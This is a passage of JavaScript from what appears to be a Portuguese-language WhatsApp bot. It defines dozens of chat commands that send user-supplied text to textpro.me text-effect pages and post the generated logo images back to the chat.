case 'jokerlogo':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-logo-joker-online-934.html",`${q}`).then(async (data) => { 
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'demon':
case 'demongreen':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-green-horror-style-text-effect-online-1036.html",`${q}`).then(async (data) => { 
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'natal':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-christmas-holiday-snow-text-effect-1007.html",`${q}`).then(async (data) => { 
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'asfalto':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/road-warning-text-effect-878.html",`${q}`).then(async (data) => { 
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, di, image, {quoted: info})
console.log(data)
 } catch(err) { 
console.log(err)
} 
});
break

case 'neon3d':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-3d-neon-light-text-effect-online-1028.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'neon':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'ossos':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/skeleton-text-effect-online-929.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'jeans':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/denim-text-effect-online-919.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'metalblue':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/glossy-blue-metal-text-effect-967.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'carbon':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/glossy-carbon-text-effect-965.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'pink':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/holographic-3d-text-effect-975.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'style':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/1917-style-text-effect-online-980.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'vidro':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/dropwater-text-effect-872.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'areia':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/write-in-sand-summer-beach-free-online-991.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'neve':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/xmas-cards-3d-online-942.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'neon3':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-futuristic-technology-neon-light-text-effect-1006.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'nuvem':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'horror':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/horror-blood-text-effect-online-883.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'matrix':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/matrix-style-text-effect-online-884.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'transformer':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'berry':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-berry-text-effect-online-free-1033.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'luxury':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/3d-luxury-gold-text-effect-online-1003.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'colaq':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'batman':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/make-a-batman-logo-online-free-1066.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'neonlight':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-neon-light-on-brick-wall-online-1062.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'glowing':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-glowing-neon-light-text-effect-online-free-1061.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case '3dchristmas':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/3d-christmas-text-effect-by-name-1055.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'neondevil':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'thunderv2':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'demonfire':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-magma-hot-text-effect-online-1030.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'neondevil':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'cattxt':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'glitch2':
var txt = body.slice(8)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-glitch-text-effect-online-free-1026.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break 

case 'grafity':
var txt = body.slice(8)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break 

case 'steel':
var txt = body.slice(7)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/3d-steel-text-effect-877.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break 

case 'marvel':
var txt = body.slice(8)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-3d-avengers-logo-online-974.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'escudo':
case 'america':
var txt = body.slice(8)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-captain-america-text-effect-free-online-1039.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break




case 'stone':
var txt = body.slice(7)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-stone-text-effect-online-982.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break


case 'gameover':
var txt = body.slice(9)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'pornhub':
var txt = body.slice(8)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'thorlogo':
var txt = body.slice(9)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-thor-logo-style-text-effect-online-1064.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'catwindows':
var txt = body.slice(8)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'ninjalogo':
var txt = body.slice(11)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-ninja-logo-online-935.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'whitebear':
var txt = body.slice(10)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'wolfgalaxy':
var txt = body.slice(11)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-wolf-logo-galaxy-online-936.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break


case 'space':
var txt = body.slice(7)
var txt1 = txt.split("/")[0] || 'Indefinido'
var txt2 = txt.split("/")[1] || 'Indefinido'
if(!txt1) return reply('Cade o primeiro texto?')
if(!txt2) return reply('Cade o segundo texto?')
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-space-3d-text-effect-online-985.html",[ `${txt1}`, `${txt2}`]).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'halloween':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/halloween-fire-text-effect-940.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'lava':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/lava-text-effect-online-914.html",`${q}`,
["Developer"], ["Phaticusthiccy"]).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'toxic':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/toxic-text-effect-online-901.html",`${q}`,
["Developer"], ["Phaticusthiccy"]).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break



case 'glowlogo':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-light-glow-sliced-text-effect-online-1068.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
await pl.sendMessage(from, {image: di, caption: 'üé®„Äå ùêãùê®ùê†ùê® ùêÅùê≤ ùêÄùê§ùêöùê¶ùêû - ùêåùêÉ „Äç‚úçüèª'}, {quoted: selo})
console.log(data)
} catch(err) { 
console.log(err)
} 
});
break

case 'laranja':
if(!q) return reply(`Digite o texto que vai aparecer na imagem | Exemplo: ${prefix + command} sad`)
reply(enviar.espere)
thiccysapi.textpro("https://textpro.me/create-a-3d-orange-juice-text-effect-online-1084.html",`${q}`).then(async (data) => {
try { 
let di = await getBuffer(data)
